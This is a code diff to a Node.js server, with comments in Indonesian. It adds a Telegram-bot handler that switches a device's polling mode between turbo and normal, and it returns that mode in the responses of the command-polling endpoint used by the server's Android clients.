@@ -546,6 +546,25 @@ Format Eksekusi Manual:
         const cmdName = parts[0];
         let cmdText = parts.slice(1).join(' ');
 
+        // Handler khusus: set_polling_mode langsung update DB tanpa antrian command
+        if (cmdName === 'set_polling_mode') {
+            const newMode = (cmdText === 'turbo' || cmdText === 'short') ? 'turbo' : 'normal';
+            const modeLabel = newMode === 'turbo' ? '⚡ TURBO' : '🔋 NORMAL';
+            try {
+                const result = await db.run('UPDATE devices SET polling_mode = ? WHERE id = ?', [newMode, devId]);
+                if (result.changes === 0) {
+                    ctx.answerCbQuery('❌ Perangkat tidak ditemukan').catch(() => { });
+                    return;
+                }
+                ctx.answerCbQuery(`✅ Mode diubah ke ${modeLabel}`).catch(() => { });
+                // Refresh menu agar label mode terupdate
+                await sendDeviceMenu(ctx, devId, false);
+            } catch (e) {
+                ctx.answerCbQuery('❌ Gagal mengubah mode').catch(() => { });
+            }
+            return;
+        }
+
         // Logika Khusus: find_id butuh input user untuk ekstensi
         if (cmdName === 'find_id' && !cmdText.includes('|')) {
             const mappedPath = pathMap[cmdText];
@@ -747,11 +766,13 @@ app.post('/webhook', (req, res) => {
 });
 
 const waitingClients = {};
-const notifyClient = (devId, cmd) => {
+const notifyClient = async (devId, cmd) => {
     if (waitingClients[devId]) {
         const res = waitingClients[devId];
         delete waitingClients[devId];
-        res.json({ command: cmd.command, text: cmd.text || '', id: cmd.id });
+        const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [devId]);
+        const pollingMode = device?.polling_mode || 'normal';
+        res.json({ command: cmd.command, text: cmd.text || '', id: cmd.id, polling_mode: pollingMode });
         return true;
     }
     return false;
@@ -763,18 +784,28 @@ app.get('/poll', async (req, res) => {
     const isOffline = offline === '1';
     await updateDeviceSeen(client_id, mode, ipv6, ipv4, isOffline);
     if (isOffline) return res.json({ status: 'offline' });
+
+    // Ambil polling_mode yang ditetapkan admin dari DB
+    const device = await db.get('SELECT polling_mode FROM devices WHERE id = ?', [client_id]);
+    const serverMode = device?.polling_mode || 'normal';
+
     const cmd = await db.get('SELECT * FROM commands WHERE device_id = ? AND status = ? ORDER BY created_at ASC LIMIT 1', [client_id, 'pending']);
     if (cmd) {
         await db.run('UPDATE commands SET status = ? WHERE id = ?', ['sent', cmd.id]);
-        return res.json({ command: cmd.command, text: cmd.text || '', id: cmd.id });
+        // Sertakan polling_mode agar Android tahu mode yang seharusnya aktif
+        return res.json({ command: cmd.command, text: cmd.text || '', id: cmd.id, polling_mode: serverMode });
     }
-    if (mode === 'turbo' || mode === 'short') return res.json({ command: 'none' });
-    if (waitingClients[client_id]) try { waitingClients[client_id].json({ command: 'none' }); } catch (e) { }
+
+    // Mode turbo: langsung balas tanpa long-polling
+    if (mode === 'turbo' || mode === 'short') return res.json({ command: 'none', polling_mode: serverMode });
+
+    // Mode normal: long-polling, tunggu hingga 25 detik
+    if (waitingClients[client_id]) try { waitingClients[client_id].json({ command: 'none', polling_mode: serverMode }); } catch (e) { }
     waitingClients[client_id] = res;
     setTimeout(() => {
         if (waitingClients[client_id] === res) {
             delete waitingClients[client_id];
-            res.json({ command: 'none' });
+            res.json({ command: 'none', polling_mode: serverMode });
         }
     }, 25000);
 });
@@ -1028,7 +1059,7 @@ app.delete('/admin/api/command/:id', async (req, res) => {
         // Hanya hapus jika status masih pending atau ubah status ke cancelled
         const cmd = await db.get('SELECT status FROM commands WHERE id = ?', [id]);
         if (!cmd) return res.status(404).json({ error: 'Command not found' });
-        
+
         if (cmd.status === 'pending') {
             await db.run('DELETE FROM commands WHERE id = ?', [id]);
             res.json({ status: 'success', message: 'Command cancelled and deleted' });
